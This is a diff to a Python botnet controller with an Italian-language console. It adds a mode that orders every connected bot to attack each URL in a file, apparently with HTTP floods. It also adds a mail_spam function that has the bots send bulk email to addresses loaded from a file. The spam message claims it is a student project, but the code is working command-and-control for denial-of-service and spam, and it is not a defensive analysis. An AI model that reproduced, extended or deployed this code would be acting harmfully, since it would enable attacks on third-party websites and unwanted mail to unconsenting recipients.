@@ -5,8 +5,8 @@ from concurrent.futures import ThreadPoolExecutor
 
 import requests
 
-server_address = ('10.0.2.15', 15200)
-# server_address = ('localhost', 15200)
+# server_address = ('10.0.2.15', 15200)
+server_address = ('localhost', 15200)
 clients = []
 
 
@@ -55,6 +55,7 @@ def handle_console(e):
         print("2. Effettua richieste http")
         print("3. Ferma attacco")
         print("4. Mostra informazioni di un client")
+        print("5. Avvia mail spam")
         print("0. Exit")
         scelta = int(input())
 
@@ -71,6 +72,8 @@ def handle_console(e):
             find_bot(path='/stop-attack', method="GET")
         elif scelta == 4:
             find_bot(path='/client-info', method="GET")
+        elif scelta == 5:
+            mail_spam()
         else:
             print("Scelta non valida")
 
@@ -92,20 +95,35 @@ def send_http_request():
     Start the attack of all the bots or of a specific bot
     """
 
-    urls = [
-        "https://federicoraponi.it/",
-        "https://alessiopannozzo.it/",
-    ]
+    with open("urls-db.txt", "r") as f:
+        urls = f.read().split("\n")
+        urls = [url for url in urls if url != ""]
+        if not urls:
+            print("Nessun URL da attaccare")
+            return
 
-    print("Seleziona un URL da attaccare: ")
-    for key, url in enumerate(urls):
-        print(f"{key + 1}. {url}")
+        print("1. Attacca tutti gli URL")
+        print("2. Attacca un URL specifico")
 
-    url = urls[int(input()) - 1]
+        scelta = int(input())
 
-    find_bot(path='/attack', method="POST", json={
-        'url': url
-    })
+        if scelta == 1:
+            for url in urls:
+                for client in clients:
+                    requests.post(f"http://{client[1][0]}/attack", json={
+                        'url': url
+                    })
+
+        else:
+            print("Seleziona un URL da attaccare: ")
+            for key, url in enumerate(urls):
+                print(f"{key + 1}. {url}")
+
+            url = urls[int(input()) - 1]
+
+            find_bot(path='/attack', method="POST", json={
+                'url': url
+            })
 
 
 def print_client_info(client, res):
@@ -113,12 +131,28 @@ def print_client_info(client, res):
     print(f"CPU: {res.json()['cpu']}")
     print(f"CPU usage: {res.json()['cpu_usage']}%")
     print(f"RAM (GB): {res.json()['ram']}")
-    print(f"RAM usage: {res.json()['ram']}%")
+    print(f"RAM usage: {res.json()['ram_usage']}%")
     print(f"System: {res.json()['system']}")
     print(f"Cores: {res.json()['cores']}")
     print(f"Total Cores: {res.json()['total_cores']}")
     print(f"Users: {res.json()['users']}")
     print("--------------------")
+
+
+def mail_spam():
+    with open("spam-db.txt", "r") as f:
+        emails = f.read().split("\n")
+        emails = [email for email in emails if email != ""]
+
+        mail_object = "Spam email"
+        message = "I'm so sorry for this spam email, but I'm testing my botnet. Please don't report me, I'm just a " \
+                  "student. Thank you for your understanding."
+        data = {
+            "emails": emails,
+            "message": message,
+            "mail_object": mail_object
+        }
+        find_bot(path='/mail-spam', method="POST", json=data)
 
 
 def find_bot(path, method, json=None):
@@ -129,14 +163,14 @@ def find_bot(path, method, json=None):
     if input("Voi utilizzare tutti i bot connessi? S/N: ") in ["S", "s"]:
         if method == "GET":
             for client in clients:
-                # res = requests.get(f"http://{client[1][0]}/{path}")
-                res = requests.get(f"http://{client[1][0]}:8080/{path}")
+                res = requests.get(f"http://{client[1][0]}/{path}")
+                # res = requests.get(f"http://{client[1][0]}:8080/{path}")
                 if path == "/client-info":
                     print_client_info(client[1][0], res)
         elif method == "POST":
             for client in clients:
-                # requests.post(f"http://{client[1][0]}/{path}", json=json)
-                requests.post(f"http://{client[1][0]}:8080/{path}", json=json)
+                requests.post(f"http://{client[1][0]}/{path}", json=json)
+                # requests.post(f"http://{client[1][0]}:8080/{path}", json=json)
     else:
         client_ip = input("Inserisci l'Ip del bot di cui vuoi sapere le info: ")
         if client_ip not in [client[1][0] for client in clients]:
@@ -144,13 +178,13 @@ def find_bot(path, method, json=None):
             return
         else:
             if method == "GET":
-                # res = requests.get(f"http://{client_ip}/{path}")
-                res = requests.get(f"http://{client_ip}:8080/{path}")
+                res = requests.get(f"http://{client_ip}/{path}")
+                # res = requests.get(f"http://{client_ip}:8080/{path}")
                 if path == "/client-info":
                     print_client_info(client_ip, res)
             elif method == "POST":
-                # requests.post(f"http://{client_ip}/{path}", json=json)
-                requests.post(f"http://{client_ip}:8080/{path}", json=json)
+                requests.post(f"http://{client_ip}/{path}", json=json)
+                # requests.post(f"http://{client_ip}:8080/{path}", json=json)
 
 
 if __name__ == '__main__':
